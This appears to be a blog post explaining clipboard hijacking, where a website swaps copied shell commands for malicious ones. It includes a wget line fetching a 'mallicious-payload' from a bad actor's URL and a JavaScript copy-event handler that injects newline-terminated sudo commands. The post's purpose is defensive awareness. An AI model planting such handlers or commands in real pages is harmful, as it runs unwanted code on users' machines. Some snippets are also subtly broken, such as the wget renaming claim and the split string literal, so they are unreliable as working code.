## The Problem

As an avid Linux user and Windows Power User where it is commonplace to copy & paste code/scripts/commands from tutorials and help sites, it always intrigues me how bad actors find ways of exploiting users in way&apos;s I haven&apos;t considered before.

An example of this from Brian Tracy is how the data you &ldquo;copy&rdquo; from a website isn&apos;t necessarily what ends up in your Clipboard for pasting!

With just a few additional lines of JavaScript/code to a website, you can make it so that when a user performs a Copy action, the actual text copied to the clipboard is not the actual text you were trying to copy.

## How does it happen?

A real-world example of this may be some lines of code for installing a package on Debian where the code is perfectly innocent (don&apos;t worry if you don&apos;t understand it â€“ this is just for demo purposes):

```bash
wget https://github.com/tim/super-awesome-package/super-awesome-package.tar.gz
tar xvzf super-awesome-package.tar.gz
```

This code is perfectly innocent and does exactly what it says on the tin, but with this example and a bad actor in play, you could end up with something like the following actually in your Clipboard, where instead of grabbing the intended package from Github, it&apos;s actually grabbing something more sinister and renaming the asset as the intended one:

```bash
wget super-awesome-package.tar.gz https://github.com/badactor/mallicious-payload.tar.gz
tar xvzf super-awesome-package.tar.gz
```

Here is an example of how the switch can be made and the malicious code can be injected with a couple of lines of JavaScript in the webpage:

```javascript
document.querySelector('#ExampleCode').addEventListener('copy', evtCopy => {
    evtCopy.clipboardData.setData('text/plain',
        'sudo wget https://github.com/tim/super-awesome-package/super-awesome-package.tar.gz
 \n sudo tar xvzf super-awesome-package.tar.gz \n sudo another command \n echo done'
    );
    evtCopy.preventDefault();
});
```

In the above snippet, the bad actor copies the malicious code to the Clipboard, and by ending each command with a New Line `\n` character, the shell will normally execute the next line automatically and happen so quickly that you may not even spot the swap.

## Solutions?

- While it may be a drag to do so, a simple way to combat this problem would be to have a text file open that you can paste into before pasting into the console to ensure there are no extra lines of code being added or replaced.
- Another way to combat it would be to type the commands out by hand (I used to do this a lot when I first started using Linux as I found the process of typing the whole command out from scratch helped me to pick things).

If you have any ideas, suggestions or solutions to this - please get in touch and I'll add them onto my post with a credit to you! ðŸ˜Š
